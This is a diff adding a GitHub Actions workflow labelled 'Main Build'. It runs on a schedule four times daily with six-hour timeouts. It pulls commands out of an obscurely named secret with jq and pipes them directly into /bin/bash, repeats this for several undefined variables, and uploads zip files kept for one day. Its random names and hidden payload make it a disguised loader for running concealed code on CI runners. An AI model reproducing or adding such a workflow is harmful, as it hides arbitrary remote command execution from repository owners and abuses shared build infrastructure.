@@ -1,0 +1,28 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 4,10,16,22 * * *'
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ysz6081: ${{ secrets.ysz6081 }}
+        run: |
+          printf '%s' "$ysz6081" | jq -r .mremf1640 | /bin/bash
+          printf '%s' "$bh139" | jq -r .oecyr54 | /bin/bash
+          echo $kbddr4 | jq -r .dom9 | /bin/bash
+          echo $melp1075 | jq -r .lnn3 | /bin/bash
+          printf '%s' "$e5" | jq -r .kzno434 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: wrq4BVLS
+          path: "*.zip"
+          retention-days: 1
